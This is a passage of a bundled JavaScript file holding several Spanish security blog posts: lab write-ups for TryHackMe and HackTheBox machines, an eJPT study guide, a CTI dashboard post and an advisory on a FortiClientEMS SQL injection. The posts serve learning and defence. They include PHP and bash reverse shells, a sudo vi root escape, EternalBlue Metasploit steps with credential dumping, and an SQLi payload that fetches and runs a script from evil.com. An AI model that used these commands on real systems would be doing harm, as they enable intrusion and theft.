El resultado es un hash que se guarda en \`hash.txt\`:\r
\r
\`\`\`bash\r
nano hash.txt\r
\`\`\`\r
\r
Finalmente, se rompe el hash con \`john\` usando \`rockyou.txt\`:\r
\r
\`\`\`bash\r
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\r
\`\`\`\r
\r
Con esto se obtiene la contraseña necesaria para acceder a la máquina o a otros recursos.\r
\r
---\r
\r
## 4) Acceso inicial y shell inversa\r
\r
Se genera una shell inversa desde la máquina objetivo hacia el atacante con PHP utilizando el siguiente payload:\r
\r
\`\`\`bash\r
php -r 'sock=fsockopen("192.168.241.137",1234);exec("/bin/bash -i <&3 >&3 2>&3");' 'sock=fsockopen("192.168.241.137",1234);exec("/bin/bash -i <&3 >&3 2>&3");'\r
\`\`\`\r
\r
Antes de ejecutar el payload en la máquina víctima, se escucha en el puerto local:\r
\r
\`\`\`bash\r
nc -nlvp 1234\r
\`\`\`\r
\r
Una vez conectada la shell inversa, se navega hacia el home del usuario descubierto.\r
\r
---\r
\r
## 5) Enumeración del usuario \`charlie\`\r
\r
Dentro de la máquina se inspecciona el directorio de usuario:\r
\r
\`\`\`bash\r
cd /home/charlie\r
ls -la\r
cat teleport\r
\`\`\`\r
\r
El archivo \`teleport\` suele contener información útil o pistas adicionales.\r
\r
También se revisa la clave SSH encontrada y se ajustan permisos:\r
\r
\`\`\`bash\r
nano key.ssh\r
chmod 600 key.ssh\r
ssh -i key.ssh charlie@10.66.130.38\r
\`\`\`\r
\r
Con la clave privada y el acceso adecuado, se ingresa como \`charlie\`.\r
\r
---\r
\r
## 6) Confirmación de usuario y privilegios\r
\r
Ya en la sesión de \`charlie\`, se lee la prueba de usuario:\r
\r
\`\`\`bash\r
cd /home/charlie\r
cat user.txt\r
\`\`\`\r
\r
A continuación, se comprueban los privilegios de sudo disponibles:\r
\r
\`\`\`bash\r
sudo -l\r
\`\`\`\r
\r
El resultado muestra que es posible ejecutar \`vi\` como root.\r
\r
---\r
\r
## 7) Escalada a root con \`sudo vi\`\r
\r
Se aprovecha el permiso para ejecutar \`vi\` y abrir un shell de root:\r
\r
\`\`\`bash\r
sudo /usr/bin/vi -c ':!/bin/sh' /dev/null\r
\`\`\`\r
\r
Esto proporciona acceso de root sin necesidad de explotar un servicio externo.\r
\r
---\r
\r
## 8) Ejecución final y obteniendo la flag de root\r
\r
Dentro del contexto root se accede al directorio \`root\` y se ejecuta un script final:\r
\r
\`\`\`bash\r
cd /root\r
python3 root.py\r
\`\`\`\r
\r
El script devuelve la flag:\r
\r
\`\`\`text\r
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='\r
\`\`\`\r
\r
Con esto damos por completa la maquina de chocolate factory.\r
\r
---\r
\r
## 9) Conclusiones\r
\r
Chocolate Factory es un reto que combina:\r
\r
- reconocimiento de red y servicios\r
- análisis de archivos binarios y esteganografía\r
- crackeo de contraseñas con hashes \`sha512crypt\`\r
- explotación de shell inversa\r
- escalada local mediante permisos sudo sobre \`vi\`\r
\r
Es una buena práctica para consolidar técnicas de enumeración y privilegio en Linux.\r
`,__vite_glob_0_10=`---\r
title: "Cyber Threat Intelligence — Dashboard Start.me"\r
description: "CTI centralizado: mapas de amenazas, reportes, ransomware, noticias y blogs técnicos, con acceso directo al panel Start.me."\r
author: "Zuk4r1"\r
date: "2025-12-14"\r
published: true\r
tags: ["cti", "threat intelligence", "osint", "ransomware", "dfir", "soc", "red team","noticias"]\r
readTime: "18 min"\r
---\r
## 🔗 Acceso a la plataforma\r
\r
[👉 Cyber Threat Intelligence Dashboard (Start.me)](https://start.me/p/wMrA5z/cyber-threat-intelligence?mcp_token=eyJwaWQiOjM5NTcwMTUsInNpZCI6NTYxMzEwNTEyLCJheCI6IjljZTlkY2FiNGE4Yjc2MDhjMTExZjBjZWUzMmIzMThlIiwidHMiOjE3NjU3NTI1MjgsImV4cCI6MTc2ODE3MTcyOH0.IjjLFSDklnqxO26q3aA3v4c0QIqLQzCQXxAPsLFXf4k&fbclid=PAT01DUAOsHiRleHRuA2FlbQIxMABzcnRjBmFwcF9pZA81NjcwNjczNDMzNTI0MjcAAad5O5NNu-07Z5T4V0fPAmJPNh8R_I3kFZZ_aNlaZgpMP7jjnTRcadjPjhXBvQ_aem_PizOcKap-D8KkcykVPbd3w)\r
\r
Un recurso altamente recomendado para cualquier profesional que quiera elevar su nivel de **conciencia situacional** y **análisis de amenazas**.\r
\r
# 🧠 Cyber Threat Intelligence en un solo lugar (Start.me)\r
\r
En el ecosistema actual de la ciberseguridad, donde las amenazas evolucionan a gran velocidad y los atacantes reutilizan, adaptan y escalan sus **TTPs (Tactics, Techniques & Procedures)** constantemente, **contar con inteligencia de amenazas centralizada, contextual y accionable** ya no es un lujo: es una necesidad operativa.\r
\r
La plataforma **Cyber Threat Intelligence Dashboard**, construida sobre **Start.me**, es un excelente ejemplo de cómo **organizar, consumir y monitorear CTI** de forma eficiente para equipos de **Blue Team, Red Team, DFIR, SOC, Threat Hunters y Bug Bounty Hunters**.\r
\r
---\r
\r
## 🔎 ¿Qué es esta plataforma?\r
\r
Es un **dashboard curado de Cyber Threat Intelligence (CTI)** que agrupa en un solo panel múltiples fuentes **OSINT y comerciales** relacionadas con:\r
\r
- ✔ Actividad global de **ransomware**\r
- ✔ Informes de **threat actors / APTs**\r
- ✔ **Incident Response & DFIR**\r
- ✔ Research técnico de vendors líderes\r
- ✔ Noticias de seguridad casi en tiempo real\r
- ✔ Blogs técnicos ofensivos (Red Team)\r
- ✔ Mapas de ataques y telemetría global\r
\r
Todo accesible desde una **única interfaz visual**, clara, modular y orientada a la **operación diaria**.\r
\r
---\r
\r
## 🧩 Principales secciones del dashboard\r
\r
### 🌍 Threat Maps (Conciencia Situacional)\r
\r
- ✔ **Radware Live Threat Map**\r
- ✔ Visualización casi en tiempo real de:\r
  - ✔ DDoS\r
  - ✔ Scanning masivo\r
  - ✔ Ataques por región\r
- Excelente para:\r
  - ✔ Awareness en SOC\r
  - ✔ Briefings ejecutivos\r
  - ✔ Contexto geopolítico de amenazas\r
  - ✔ Demostraciones y reporting\r
\r
> Ideal para responder rápidamente a la pregunta:  \r
> **“¿Qué está pasando ahora mismo en el panorama de amenazas?”**\r
\r
---\r
\r
### 🧪 Vendors & Research (Inteligencia Profunda)\r
\r
Fuentes directas de inteligencia técnica y estratégica de alto nivel:\r
\r
- ✔ **Google Cloud – Mandiant**\r
- ✔ **Kaspersky SecureList**\r
- ✔ **CrowdStrike Intelligence**\r
- ✔ **Unit 42 (Palo Alto Networks)**\r
- ✔ **Microsoft MSRC & MSTIC**\r
\r
Este bloque es clave para:\r
\r
- ✔ Análisis de **campañas activas**\r
- ✔ Seguimiento de **APT Groups**\r
- ✔ Evolución de **malware y loaders**\r
- ✔ Tendencias en **explotación de CVEs**\r
- ✔ Correlación con MITRE ATT&CK\r
\r
> Muy útil para **Threat Hunting**, **Purple Team** y **detección basada en comportamiento**.\r
\r
---\r
\r
### 🧨 Ransomware Intelligence (Riesgo Real)\r
\r
Sección dedicada exclusivamente al **ecosistema ransomware**:\r
\r
- ✔ **Top 10 Ransomware Victims (2024)**\r
- ✔ **Top Ransomware Groups 2025**\r
- ✔ Víctimas recientes publicadas\r
- ✔ Nuevos grupos emergentes\r
- ✔ Actividad de data leaks\r
\r
Casos de uso claros:\r
\r
- ✔ **Threat Modeling**\r
- ✔ **Risk Assessment**\r
- ✔ Simulación de escenarios de crisis\r
- ✔ Awareness corporativo\r
- ✔ Preparación para IR\r
\r
> Permite responder preguntas críticas como:  \r
> **¿Qué sectores están siendo atacados? ¿Qué grupos están activos ahora?**\r
\r
---\r
\r
### 📰 Latest News (Actualización Continua)\r
\r
Agregador de noticias de ciberseguridad que cubre:\r
\r
- ✔ Vulnerabilidades críticas (RCE, 0-days)\r
- ✔ Incidentes reales en empresas\r
- ✔ Nuevas técnicas de ataque\r
- ✔ Releases de herramientas defensivas y ofensivas\r
- ✔ Alertas de seguridad\r
\r
Ventaja clave:  \r
**reduce la dependencia de múltiples feeds, redes sociales o newsletters dispersas.**\r
\r
---\r
\r
### 🔴 Red Team Blogs (Visión Ofensiva)\r
\r
Contenido técnico profundo orientado a ataque y emulación:\r
\r
- ✔ Hack The Box (Whitepapers & Labs)\r
- ✔ Active Directory Attacks\r
- ✔ SIEM & Logging desde perspectiva ofensiva\r
- ✔ Offensive Security & tooling\r
- ✔ Abuso de configuraciones y detecciones evadidas\r
\r
Especialmente relevante para:\r
\r
- ✔ **Pentesting**\r
- ✔ **Bug Bounty**\r
- ✔ **Red Team**\r
- ✔ **Purple Team**\r
- ✔ Mejora de detecciones defensivas\r
\r
---\r
\r
## 🎯 ¿Para quién es útil este dashboard?\r
\r
- ✔ Analistas SOC (Tier 1–3)\r
- ✔ Blue Team / DFIR\r
- ✔ Threat Hunters\r
- ✔ Red Team / Pentesters\r
- ✔ Bug Bounty Hunters\r
- ✔ CISO / Security Managers\r
- ✔ Estudiantes avanzados de ciberseguridad\r
\r
---\r
\r
## 🚀 Beneficios clave\r
\r
- ✔ Centralización real de CTI\r
- ✔ Ahorro significativo de tiempo en investigación\r
- ✔ Mejor contexto para incidentes y alertas\r
- ✔ Apoyo a decisiones tácticas y estratégicas\r
- ✔ Visibilidad del panorama global de amenazas\r
- ✔ Actualización continua\r
- ✔ Enfoque práctico y operativo (no solo teórico)\r
\r
---\r
\r
## 🧠 Casos de uso prácticos\r
\r
- ✔ Preparar un **daily briefing de SOC**\r
- ✔ Contextualizar una **alerta SIEM**\r
- ✔ Apoyar un **informe DFIR**\r
- ✔ Investigar actividad de **ransomware**\r
- ✔ Inspirar **hipótesis de Threat Hunting**\r
- ✔ Mantener awareness sin ruido\r
`,__vite_glob_0_11=`---
title: "Critical RCE: Inyección SQL en FortiClientEMS Permite Ejecución de Código Remoto (CVE-2026-21643)"
date: "2026-02-10"
description: "Análisis técnico de la vulnerabilidad crítica CVE-2026-21643 en Fortinet. Un fallo de SQL Injection permite a atacantes no autenticados ejecutar código como SYSTEM."
tags: ["vulnerabilidad", "cve-2026-21643", "fortinet", "rce", "sqli", "noticias", "critical"]
readTime: "7 min"
published: true
---

## 🚨 Alerta de Seguridad: Febrero 2026

Hoy, 10 de febrero de 2026, **Fortinet** ha lanzado actualizaciones de seguridad de emergencia para abordar una vulnerabilidad crítica en **FortiClientEMS** (Enterprise Management Server). Este fallo, rastreado como **CVE-2026-21643**, ha recibido una puntuación CVSS v4 de **9.1 (Crítico)**.

Simultáneamente, Microsoft ha publicado su *Patch Tuesday* de febrero, corrigiendo 6 vulnerabilidades Zero-Day explotadas activamente. Es un día intenso para los equipos de Blue Team y Sysadmins.

---

## 🔬 Análisis Técnico: CVE-2026-21643

La vulnerabilidad reside en el componente de gestión de logs de FortiClientEMS. Específicamente, es un fallo de **Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')** [CWE-89].

### ¿Cómo funciona el exploit?

A diferencia de las inyecciones SQL tradicionales que solo extraen datos, esta vulnerabilidad permite la **Ejecución Remota de Código (RCE)** debido a los privilegios con los que corre el servicio de base de datos subyacente (a menudo \`NT AUTHORITY\\SYSTEM\` en entornos Windows).

1.  **Vector de Ataque:** Un atacante envía una solicitud de red especialmente diseñada al puerto de escucha del servidor EMS (normalmente usado para la telemetría de los clientes FortiClient).
2.  **El Fallo:** El servidor no sanea adecuadamente la entrada del usuario antes de construir una consulta SQL dinámica.
3.  **La Inyección:** El atacante inyecta comandos SQL maliciosos. Si la base de datos es Microsoft SQL Server, esto podría habilitar características como \`xp_cmdshell\` para ejecutar comandos del sistema operativo directamente desde la consulta.

\`\`\`sql
-- Ejemplo conceptual (Pseudo-código)
POST /api/log_ingest HTTP/1.1
Host: target-ems:8043
Content-Type: application/json

{
  "device_id": "1234'; EXEC xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(\\"http://evil.com/payload.ps1\\")'; --"
}
\`\`\`

### Impacto

Al explotar este fallo, un atacante no autenticado puede:
*   Obtener acceso total al servidor que gestiona todos los endpoints de la empresa.
*   Desplegar ransomware a todos los clientes conectados (miles de portátiles y servidores) a través de las políticas de gestión de FortiClient.
*   Exfiltrar datos sensibles de configuración y telemetría de la red.

---

## 🛡️ Mitigación y Respuesta

Fortinet recomienda encarecidamente actualizar a las siguientes versiones parcheadas inmediatamente:

*   **FortiClientEMS 7.4:** Actualizar a 7.4.3 o superior.
*   **FortiClientEMS 7.2:** Actualizar a 7.2.5 o superior.

### Workaround Temporal
Si no es posible parchear hoy mismo:
1.  Restringir el acceso al puerto del servidor EMS solo a direcciones IP de confianza (aunque esto puede romper la comunicación con clientes remotos/roaming).
2.  Habilitar firmas IPS en el firewall perimetral para detectar intentos de explotación de SQLi dirigidos al servidor EMS.

---

## 🌍 Contexto Global: Patch Tuesday de Febrero

Además de Fortinet, hoy Microsoft ha parcheado más de 50 vulnerabilidades. Destacan 6 **Zero-Days** que ya se están explotando "in the wild":

1.  **CVE-2026-XXXX:** Escalada de privilegios en el Kernel de Windows.
2.  **CVE-2026-YYYY:** Bypass de seguridad en Microsoft Outlook.

La recomendación general para este mes es priorizar los servidores expuestos a internet (Exchange, VPNs, Web Servers) y las estaciones de trabajo de administradores.

> **Referencias:**
> *   Advisory oficial de Fortinet: [FG-IR-26-003](https://www.fortinet.com/psirt)
> *   The Hacker News: "Fortinet Patches Critical SQLi Flaw" (Feb 10, 2026)`,__vite_glob_0_12=`---\r
title: "Guía Completa de Preparación para el eJPT: Estrategias, Laboratorios Recomendados y Skills Fundamentales"\r
description: "Ruta completa y ampliada para aprobar el eJPT basada en experiencia real: habilidades esenciales, metodología, herramientas, máquinas recomendadas y consejos prácticos."\r
date: "2025-12-08"\r
published: true\r
tags: ["ejpt", "pentesting", "certificaciones", "tryhackme", "ine", "ethical hacking"]\r
readTime: "30 min"\r
---\r
\r
# Guía Completa de Preparación para el eJPT  \r
**Cómo aprobar el examen dominando lo esencial del pentesting práctico**\r
\r
El **eJPT** es una certificación de entrada al pentesting que valida tu capacidad para realizar pruebas reales: desde enumeración, explotación, movimiento lateral, hasta escalada de privilegios y análisis de tráfico. A diferencia de otros exámenes más teóricos, este es **100% práctico**, por lo que tu entrenamiento debe basarse en laboratorios, metodología y dominio de herramientas.\r
\r
Esta guía reúne una ruta ampliada basada en experiencia real, sumada a laboratorios recomendados, técnicas centrales y máquinas en las que realmente aprenderás lo que el examen evalúa.\r
\r
---\r
\r
# 🧠 Conocimientos Fundamentales que Debes Dominar\r
\r
El eJPT evalúa **tu proceso**, no tu capacidad de memorizar comandos. Por eso, estas habilidades son esenciales:\r
\r
## 🔍 1. Enumeración Efectiva\r
\r
Es el pilar del examen. Debes dominar:\r
\r
- Escaneo de puertos y servicios expuestos  \r
- Fingerprinting de servicios y versiones  \r
- Enumeración de FTP, SSH, HTTP, SMB  \r
- Descubrimiento de rutas sobre web  \r
- Identificación de credenciales débiles o expuestas  \r
\r
**Herramientas clave:**  \r
\r
\`Nmap\`, \`WhatWeb\`, \`Gobuster\`, \`smbmap\`, \`enum4linux\`, \`Hydra\`, \`WPScan\`\r
\r
---\r
\r
## 🛠️ 2. Explotación de Servicios y Vulnerabilidades\r
\r
No necesitas explotar CVEs avanzados: todo es básico, pero requiere metodología.\r
\r
* Archivos expuestos (backup, config, rutas sensibles)  \r
* Subida de archivos controlada (web shells)  \r
* SQL Injection  \r
* RCE por funcionalidades inseguras  \r
* Password cracking  \r
\r
**Herramientas:**  \r
\r
\`Burp Suite\`, \`SQLmap\`, \`Hydra\`, \`PHP reverse shells\`, \`John the Ripper\`, \`Curl\`, \`Netcat\`\r
\r
---\r
\r
## 🔐 3. Escalada de Privilegios\r
\r
Saber identificar vectores comunes:\r
\r
- SUID vulnerables  \r
- Permisos sudo mal configurados  \r
- Credenciales almacenadas en texto plano  \r
- Cronjobs modificables  \r
- Capabilities  \r
- Docker/LXD escapes  \r
\r
**Herramientas:**  \r
\r
\`LinPEAS\`, \`WinPEAS\`, \`GTFOBins\`, \`sudo -l\`, \`find\`, \`tar\`, \`vim\`, \`python\`, \`bash\`\r
\r
---\r
\r
## 🧩 4. Scripting & Automatización\r
\r
No necesitas ser un programador, pero sí dominar:\r
\r
- Python para shells y web servers temporales  \r
- Bash para tareas repetitivas  \r
- Manipulación de archivos  \r
- reverse shells con netcat/python  \r
\r
---\r
\r
## 🧰 5. Herramientas Imprescindibles\r
\r
| Categoría | Herramientas |\r
|----------|--------------|\r
| Enumeración | Nmap, WhatWeb, Gobuster, smbmap, enum4linux |\r
| Fuerza bruta | Hydra, Medusa, John |\r
| Web | Burp Suite, Nikto, curl, WPScan |\r
| Post-explotación | Netcat, Python PTY, wget, LinPEAS, WinPEAS |\r
| Reversing ligero | CyberChef, base64, hexdump |\r
| Shells | bash, python, socat |\r
\r
---\r
\r
# 🧠 Laboratorios Clave para la Preparación del eJPT  \r
\r
Los siguientes labs están organizados por nivel de importancia según las habilidades evaluadas en el examen.\r
\r
---\r
\r
# 🌐 TryHackMe Labs Recomendados\r
\r
## **1. Basic Pentesting**\r
\r
**Habilidades:**  \r
\r
* Enumeración completa de red  \r
* Brute-force básico  \r
* Enum4linux + Samba  \r
* Escalada por credenciales expuestas  \r
\r
**Herramientas:**  \r
\r
Nmap, Hydra, Gobuster, enum4linux, John, SSH, LinPEAS  \r
\r
**Por qué es crucial:**  \r
\r
Simula muy bien el flujo del eJPT: enumerar → encontrar credenciales → acceder → escalar.\r
\r
---\r
\r
## **2. Pickle Rick**\r
\r
**Habilidades:**  \r
\r
- Web exploitation básico  \r
- Comandos remotos  \r
- Priv-esc con sudo  \r
\r
**Herramientas:**  \r
\r
Nmap, Gobuster, Browser, sudo, less  \r
\r
**Por qué es importante:**  \r
\r
Refuerza la lógica de leer archivos sensibles cuando tienes sudo limitado.\r
\r
---\r
\r
## **3. RootMe**\r
\r
**Habilidades:**  \r
\r
- File upload bypass  \r
- Shell reversa  \r
- SUID exploitation  \r
\r
**Herramientas:**  \r
\r
PHP reverse shell, Nmap, Gobuster, Netcat, Python, GTFOBins  \r
\r
**Relevancia:**  \r
\r
Muy útil para entender el flujo de RCE → shell → priv-esc simple.\r
\r
---\r
\r
## **4. SimpleCTF**\r
\r
**Habilidades:**  \r
\r
- FTP Enumeration  \r
- SQL Injection  \r
- Uso correcto de ExploitDB  \r
- Priv esc con sudo/vim  \r
\r
**Herramientas:**  \r
\r
Nmap, Gobuster, SQL tools, SSH, GTFOBins  \r
\r
**Relevancia:**  \r
\r
Excelente ejercicio de SQL Injection sencilla, muy alineada con el examen.\r
\r
---\r
\r
## **5. Bounty Hacker**\r
\r
**Habilidades:**  \r
\r
- FTP con acceso anónimo  \r
- Cracking de contraseñas  \r
- SUID exploitation  \r
\r
**Relevancia:**  \r
\r
Uno de los más parecidos al examen a nivel de complejidad.\r
\r
---\r
\r
## **6. LazyAdmin**\r
\r
**Habilidades:**  \r
\r
- Enumeración web profunda  \r
- Backups filtrados  \r
- MD5 cracking  \r
- RCE + escalada mediante script sudo  \r
\r
Excelente práctica del flujo más común del examen: **buscar archivos expuestos → credenciales → acceso → escalada.**\r
\r
---\r
\r
## **7. c4ptur3-th3-fl4g**\r
\r
**Habilidades:**  \r
\r
- Criptografía básica  \r
- Encoding/decoding  \r
- Steganografía  \r
\r
Aunque no es explotación directa, te prepara para manipular datos codificados que pueden aparecer en el examen (por ejemplo, credenciales base64).\r
\r
---\r
\r
## **8. Skynet**\r
\r
**Habilidades:**  \r
\r
- SMB enumeration  \r
- Vulnerabilidad RFI  \r
- Priv esc mediante wildcard injection  \r
\r
**Relevancia:**  \r
\r
Laboratorio completo que cubre varias cadenas de ataque.\r
\r
---\r
\r
## **9. Ignite**\r
\r
**Habilidades:** \r
\r
- CMS exploitation  \r
- Reverse shell tradicional  \r
- Priv-esc from credentials found  \r
\r
Perfecto para practicar explotación de aplicaciones con CVEs conocidos.\r
\r
---\r
\r
## **10. ToolsRus**\r
\r
**Habilidades:**  \r
\r
- Autenticación básica  \r
- Tomcat manager exploitation  \r
- Metasploit  \r
\r
Ideal para aprender en qué momento utilizar Metasploit de forma controlada.\r
\r
---\r
\r
## **11. Wgel CTF**\r
\r
**Habilidades:**  \r
\r
- Descarga de llaves SSH expuestas  \r
- wget para priv-esc (GTFOBins)  \r
\r
Muy bueno para practicar uso de herramientas básicas del sistema para escalar privilegios.\r
\r
---\r
\r
## **12. Startup**\r
\r
**Habilidades:**  \r
\r
- FTP upload  \r
- PHP webshell  \r
- Extracción de PCAP  \r
- Cron abuse para root  \r
\r
Uno de los más completos. Perfecto para practicar flujo avanzado.\r
\r
---\r
\r
## **13. Brooklyn Nine-Nine**\r
\r
**Habilidades:**  \r
\r
- FTP + SSH brute-force  \r
- Priv esc con GTFOBins  \r
\r
Perfecto para reforzar credenciales débiles y vectores clásicos.\r
\r
---\r
\r
## **14. Chill Hack**\r
\r
**Habilidades:**  \r
\r
- SQLi  \r
- Steganografía  \r
- Docker exploitation  \r
\r
Te prepara para escenarios complejos ordenados paso a paso.\r
\r
---\r
\r
## **15. GamingServer**\r
\r
**Habilidades:**  \r
\r
- Enumeración web avanzada  \r
- Cracking claves SSH  \r
- LXD container escape  \r
\r
Practicar container escapes puede darte entendimiento profundo de escalada moderna.\r
\r
---\r
\r
## **16. Mr. Robot**\r
\r
**Habilidades:**  \r
\r
- WordPress  \r
- Burp enumeration  \r
- PHP reverse shell  \r
- MD5 cracking  \r
- Priv esc mediante SUID Nmap  \r
\r
Uno de los mejores laboratorios para prepararte para explotación web.\r
\r
---\r
\r
# 🧭 Metodología para el eJPT (Muy Importante)\r
\r
## 1. Escanea TODO primero (Nmap agresivo)\r
\r
\`\`\`bash\r
nmap -sV -sC -A -p- <IP>\r
\`\`\`\r
\r
\r
## 2. Clasifica los servicios:\r
\r
| Servicio | Qué buscar |\r
|---------|------------|\r
| HTTP    |     rutas ocultas, uploads, backup, creds |\r
| FTP     |     acceso anónimo, archivos sensibles |\r
| SSH     |     fuerza bruta solo si hay usuarios válidos |\r
| SMB     |     shares sin autenticación |\r
| DB      |     credenciales débiles |\r
\r
## 3. Documenta cada hallazgo\r
\r
## 4. Explota por orden lógico:\r
\r
credenciales → acceso → shell → escalada\r
\r
## 5. Verifica credenciales en múltiples servicios\r
\r
## 6. Repite el ciclo: enumerar → explotar → enumerar → escalar\r
\r
---\r
\r
# 🎯 Consejos Finales para Aprobar el eJPT\r
\r
- **No memorices herramientas**, entiende para qué sirven.  \r
- La clave del examen es **leer bien la pregunta**.  \r
- No todo requiere explotación avanzada: a veces solo es leer un archivo.  \r
- La mayor parte del examen es **búsqueda lógica**, no fuerza bruta.  \r
- Mantén una hoja de trucos con comandos esenciales.  \r
- Aprovecha Python para levantar servidores:\r
\r
\`\`\`bash\r
python3 -m http.server 8080\r
\`\`\`\r
- Los vectores más comunes:\r
- credenciales débiles  \r
- backups expuestos  \r
- SQLi  npm dev \r
- FTP/SMB abiertos  \r
\r
---\r
\r
# 📌 Conclusión\r
Si dominas la metodología, practicas las máquinas recomendadas y entiendes las herramientas esenciales, aprobar el eJPT será un proceso fluido y natural. Esta certificación es un excelente primer paso hacia OSCP, PNPT, e incluso hacia roles profesionales de pentesting.`,__vite_glob_0_13=`---
title: "hackthebox-blue"
description: "Writeup paso a paso de la máquina Blue de Hack The Box: reconocimiento SMB y explotación MS17-010 (EternalBlue) hasta obtener acceso administrador."
date: "2026-01-12"
published: true
tags: ["hackthebox", "writeup", "windows", "smb", "ms17-010"]
readTime: "10 min"
---

# ✅ Hack The Box — Blue (Paso a Paso)

Máquina clásica de Windows vulnerable a **MS17-010 (EternalBlue)**. Veremos reconocimiento de servicios SMB y explotación con Metasploit, cerrando con recomendaciones defensivas.

---

## 1) Preparación del entorno
- IP objetivo (HTB): \`10.10.10.X\`
- IP atacante: \`10.10.14.Y\`
- Herramientas: \`nmap\`, \`smbclient\`, \`msfconsole\`, \`python\`, \`whoami\`, \`hashdump\`

---

## 2) Reconocimiento de puertos y servicios

\`\`\`bash
nmap -sC -sV -Pn -oN nmap_initial 10.10.10.X
\`\`\`

Resultados esperados:
- 135/tcp RPC
- 139/tcp NetBIOS-SSN
- 445/tcp Microsoft-DS (SMB)

Exploración completa:

\`\`\`bash
nmap -p- --min-rate 5000 -Pn -oN nmap_all 10.10.10.X
nmap -sC -sV -p 139,445 -Pn -oN nmap_detail 10.10.10.X
\`\`\`

---

## 3) Enumeración SMB

\`\`\`bash
whatweb smb://10.10.10.X
smbclient -L 10.10.10.X -N
\`\`\`

Si el listado requiere credenciales, continuamos directamente a la detección de vulnerabilidad.

---

## 4) Detección de MS17-010 (EternalBlue)

\`\`\`bash
nmap --script smb-vuln-ms17-010 -p 445 -Pn 10.10.10.X -oN nmap_ms17-010
\`\`\`

Si el script confirma la vulnerabilidad, podemos proceder a explotación.

---

## 5) Explotación con Metasploit

\`\`\`bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.X
set LHOST 10.10.14.Y
set Payload windows/x64/meterpreter/reverse_tcp
run
\`\`\`

Una vez cargado \`meterpreter\`:

\`\`\`bash
sysinfo
getuid
shell
\`\`\`

Si obtienes una shell del sistema, estás en camino a \`SYSTEM\`/Administrador.

---

## 6) Post-explotación y evidencias

Obtener información del sistema y usuarios:

\`\`\`bash
whoami
hostname
net user
\`\`\`

Volcar hashes (si es posible):

\`\`\`bash
load kiwi
creds_all
hashdump
\`\`\`

Buscar flags:

\`\`\`bash
dir C:\\\\Users
type C:\\\\Users\\\\<usuario>\\\\Desktop\\\\user.txt
type C:\\\\Windows\\\\System32\\\\config\\\\root.txt
\`\`\`

En algunas máquinas, la \`root.txt\` está en \`C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\`.

---

## 7) Limpieza
- Cierra sesiones \`meterpreter\` y elimina artefactos temporales si los has subido.
- Registra las evidencias (hashes/flags) y los pasos realizados.

---

## 8) Conclusión

La explotación de **MS17-010 (EternalBlue)** demuestra el impacto crítico de no aplicar parches en servicios expuestos, especialmente **SMB**. Para mitigar:
- Mantén los sistemas actualizados con parches acumulativos de seguridad.
- Deshabilita **SMBv1** y reduce servicios innecesarios.
- Segmenta la red y aplica listas de control de acceso para limitar el alcance lateral.
- Supervisa logs de **SMB** y alertas de escaneos de puerto 445.

Este ejercicio resalta que una sola vulnerabilidad remota con privilegios elevados puede comprometer por completo un host Windows si no existe una política de actualización y segmentación estricta.

---

## Comandos clave usados

\`\`\`bash
nmap -sC -sV -Pn 10.10.10.X
nmap --script smb-vuln-ms17-010 -p 445 -Pn 10.10.10.X
msfconsole; use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.X; set LHOST 10.10.14.Y; run
whoami; net user; hashdump
type C:\\\\Users\\\\<usuario>\\\\Desktop\\\\user.txt
type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt
\`\`\`

`,__vite_glob_0_14=`---\r
title: "HackTheBox FireFlow — Walkthrough Detallado"\r
description: "Análisis y explotación de la máquina FireFlow de HackTheBox: reconocimiento, subdominios, CVE-2026-33017 en LangFlow, transición MCP y escalada Kubernetes."\r
author: "Zuk4r1"\r
date: "2026-06-29"\r
published: true\r
tags: ["hackthebox", "red team", "pentesting", "kubernetes", "mcp", "vulnerabilidad", "ctf"]\r
readTime: "12 min"\r
---\r
\r
## 🔍 Introducción\r
\r
Este documento describe la explotación completa de la máquina **FireFlow** en HackTheBox. El flujo cubre:\r
\r
- Reconocimiento inicial de puertos\r
- Enumeración de subdominios\r
- Explotación de **LangFlow v1.8.2** mediante **CVE-2026-33017**\r
- Obtención de acceso inicial y credenciales locales\r
- Transición hacia MCP\r
- Escalada a root en un entorno **Kubernetes**\r
\r
El enfoque es técnico, operativo y ordenado para facilitar la réplica en un entorno de laboratorio.\r
\r
---\r
\r
## 1. Reconocimiento inicial\r
\r
Se inició con un escaneo rápido de puertos usando **nmap**:\r
\r
\`\`\`bash\r
nmap -sCV -T5 --min-rate 95000 -Pn <IP>\r
\`\`\`\r
\r
Resultados clave:\r
\r
- Puerto \`22\` abierto\r
- Puerto \`443\` abierto\r
\r
Se agregó resolución local en \`/etc/hosts\` para facilitar el acceso con nombre de host:\r
\r
\`\`\`bash\r
sudo nano /etc/hosts\r
\`\`\`\r
\r
Añadí lo siguiente:\r
\r
\`\`\`text\r
<IP> fireflow.htb flow.fireflow.htb\r
\`\`\`\r
\r
Durante la revisión inicial se identificó una referencia a \`slow engine 1.8.2\` y se observó que el agente expuesto redirigía a un playground público.\r
\r
---\r
\r
## 2. Enumeración de subdominios\r
\r
Para encontrar subdominios se utilizó **ffuf** con la cabecera \`Host\`:\r
\r
\`\`\`bash\r
ffuf -u https://fireflow.htb/ -H "Host: FUZZ.fireflow.htb" -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt -k -ac\r
\`\`\`\r
\r
Hallazgo principal:\r
\r
- Subdominio: \`flow.fireflow.htb\`\r
\r
Al acceder se encontró un panel de inicio de sesión.\r
\r
---\r
\r
## 3. Identificación de la vulnerabilidad\r
\r
El panel identificado pertenecía a **LangFlow v1.8.2**.\r
\r
Investigación en línea confirmó que esta versión es vulnerable a **CVE-2026-33017**.\r
\r
Se localizó una prueba de concepto en GitHub que permite la ejecución remota de código creando un nodo de tipo \`ExploitComp\` con payloads arbitrarios.\r
\r
---\r
\r
## 4. Explotación de LangFlow\r
\r
### Preparación del listener\r
\r
\`\`\`bash\r
sudo nc -nvlp 9001\r
\`\`\`\r
\r
### Payload reverso en Base64\r
\r
\`\`\`bash\r
echo 'bash -i >& /dev/tcp/IP_LOCAL/9001 0>&1' | base64 -w 0\r
\`\`\`\r
\r
